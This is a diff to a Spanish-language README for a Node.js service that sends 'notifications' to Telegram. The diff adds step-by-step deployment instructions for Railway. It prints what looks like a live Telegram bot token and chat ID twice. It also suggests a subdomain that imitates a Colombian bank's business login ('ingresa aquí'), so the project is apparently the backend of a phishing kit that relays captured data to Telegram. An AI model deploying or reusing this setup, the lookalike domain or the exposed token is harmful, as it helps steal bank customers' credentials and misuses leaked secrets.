@@ -12,7 +12,7 @@ Sistema profesional de notificaciones en tiempo real que envía alertas a Telegr
 - ⚡ Respuestas no bloqueantes (notificaciones asíncronas)
 - 🎨 Página de bienvenida personalizada
 
-## 🚀 Instalación
+## 🚀 Instalación Local
 
 ### 1. Instalar dependencias
 
@@ -22,7 +22,13 @@ npm install
 
 ### 2. Configurar variables de entorno
 
-El archivo `.env` ya está configurado con tus credenciales:
+Copia el archivo `.env.example` a `.env` y configura tus credenciales:
+
+```bash
+cp .env.example .env
+```
+
+Edita el archivo `.env` con tus credenciales:
 
 ```env
 TELEGRAM_BOT_TOKEN=8218791532:AAGzW0SC_1lxXeIJffJPZSj5h-h-AoHHXMQ
@@ -36,6 +42,45 @@ NODE_ENV=production
 ```bash
 npm start
 ```
+
+## ☁️ Deploy en Railway
+
+### Paso 1: Conectar el repositorio
+
+1. Ve a [railway.app](https://railway.app) e inicia sesión
+2. Click en **"New Project"**
+3. Selecciona **"Deploy from GitHub repo"**
+4. Autoriza Railway a acceder a tu cuenta de GitHub
+5. Selecciona el repositorio: `cabrongerson0-rgb/triconego-clicks`
+
+### Paso 2: Configurar Variables de Entorno (IMPORTANTE)
+
+⚠️ **Railway NO lee el archivo .env por seguridad. Debes configurar las variables manualmente:**
+
+1. Una vez desplegado el proyecto, ve a la pestaña **"Variables"**
+2. Click en **"New Variable"** o **"Raw Editor"**
+3. Agrega las siguientes variables:
+
+```env
+TELEGRAM_BOT_TOKEN=8218791532:AAGzW0SC_1lxXeIJffJPZSj5h-h-AoHHXMQ
+TELEGRAM_CHAT_ID=-5086285193
+NODE_ENV=production
+```
+
+4. Click en **"Save"** o presiona `Ctrl + S`
+
+### Paso 3: Configurar Dominio (Opcional)
+
+1. Ve a **"Settings"** → **"Networking"** → **"Public Networking"**
+2. Click en **"Generate Domain"** o configura un dominio personalizado
+3. Si quieres usar: `svnegoci0sbncolombiaingresaqui.up.railway.app`
+   - Contacta a Railway para configurar este subdominio específico
+
+### Paso 4: Redeploy
+
+1. Ve a **"Deployments"**
+2. Click en **"Redeploy"** para que tome las nuevas variables
+3. Verifica que el servidor inicie correctamente en los logs
 
 ## 📁 Estructura del Proyecto
 
